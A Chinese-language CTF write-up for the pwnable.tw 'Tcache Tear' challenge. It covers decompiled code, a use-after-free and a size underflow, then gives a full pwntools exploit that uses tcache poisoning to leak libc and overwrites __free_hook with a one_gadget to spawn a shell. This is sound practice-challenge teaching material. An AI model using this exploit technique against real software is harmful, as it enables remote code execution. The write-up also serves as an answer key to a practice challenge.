# pwnable.tw-Tcache Tear

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

## IDA

**add**

```c
int add()
{
  unsigned __int64 v0; // rax
  int size; // [rsp+8h] [rbp-8h]

  printf("Size:");
  v0 = choice();
  size = v0;
  if ( v0 <= 0xFF )
  {
    ptr = malloc(v0);
    printf("Data:");
    my_read((__int64)ptr, size - 16);
    LODWORD(v0) = puts("Done !");
  }
  return v0;
}
```

**main**

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  Init(a1, a2, a3);
  printf("Name:");
  my_read(&name, 32LL);
  v4 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = choice();
      if ( v3 != 2 )
        break;
      if ( v4 <= 7 )
      {
        free(ptr);
        ++v4;
      }
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        show();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_14:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_14;
      add();
    }
  }
}
```

**show**

```c
ssize_t show()
{
  printf("Name :");
  return write(1, &name, 0x20uLL);
}
```

漏洞点有两个地方:

- free后指针未清零，对本题来说可以造成UAF
- 在add函数中，若size<16，则会整数溢出，可写入任意长度数据

got表不可写，同时也没有输出函数，只有将名字进行输出。首先，想办法进行leak，通过uaf，我们可以对任意已知地址的内存进行读写，所以我们将name所在的内存伪造成一个large chunk，将其free，再show就可以leak libc，之后就是简单了。

为了成功将large chunk进行free，我们需要构造三个chunk，看下面的这段代码：

```c
    nextsize = chunksize(nextchunk);
    if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (nextsize >= av->system_mem, 0))
      malloc_printerr ("free(): invalid next size (normal)");
	···
    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
```

该段代码检查free的chunk的nextchunk大小是否满足要求，还检查了nextchunk的inuse位，这一位在nextchunk的nextchunk中，所以我们要伪造三个chunk。

首先，先将两个nextchunk构造出来，在`name+0x500`的地方伪造通过任意地址读写伪造两个`0x20`的chunk，之后在将name的chunk取出free掉。

## exp

```python
from pwn import *
# from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']

binary='./tcache_tear'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	log.info('Test in local...')
	sh=process(binary)
if 'r' in sys.argv[1]:
	log.info('Attacking...')
	sh=remote('chall.pwnable.tw', 10207)

elf = ELF(binary,checksec=False)
libc = ELF('./libc.so',checksec=False)

def add(size,data):
	sh.recvuntil('choice :')
	sh.sendline('1')
	sh.recvuntil('Size:')
	sh.send(str(size))
	sh.recvuntil('Data:')
	sh.send(data)

def free():
	sh.recvuntil('choice :')
	sh.sendline('2')

name = 0x602060
one = [0x4f2c5, 0x4f322,0x10a38c]
sh.sendline(p64(0)+p64(0x501))

add(0x50,'a'*8+'\n') # 0x100
free()
free()

add(0x50,p64(name+0x500))
add(0x50,'aaa')
add(0x50,p64(0)+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)*2)

add(0x60,'aaaa')
free()
free()
add(0x60,p64(name+0x10))
add(0x60,'aaa')
add(0x60,'a')
free()
# gdb.attach(sh)
sh.recvuntil('choice :')
sh.sendline('3')
malloc_hook = u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 96 - 0x10 
libc.address = malloc_hook - libc.sym['__malloc_hook']
one_gadget = libc.address + one[1]
leak('libc base',libc.address)

add(0x70,'aaaa')
free()
free()
add(0x70,p64(libc.sym['__free_hook']))
add(0x70,'aaa')
add(0x70,p64(one_gadget))
free()

sh.interactive()
```

